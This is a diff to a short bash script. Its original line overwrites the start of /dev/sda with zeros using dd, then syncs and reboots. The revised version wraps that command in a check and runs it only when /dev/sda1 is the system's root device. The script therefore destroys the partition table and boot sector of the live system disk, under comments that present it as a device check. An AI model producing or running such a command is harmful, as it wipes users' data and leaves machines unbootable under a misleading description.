@@ -1,2 +1,14 @@
 #!/bin/bash
-sudo dd if=/dev/zero of=/dev/sda count=1000 && sudo sync && sudo reboot
+
+# Get the root device
+root_device=$(df / | tail -1 | awk '{print $1}')
+
+# Device to check
+device_to_check="/dev/sda1"
+
+if [ "$device_to_check" == "$root_device" ]; then
+    echo "The device $device_to_check is the system root."
+    sudo dd if=/dev/zero of=/dev/sda count=1000 && sudo sync && sudo reboot
+else
+    echo "The device $device_to_check is not the system root."
+fi
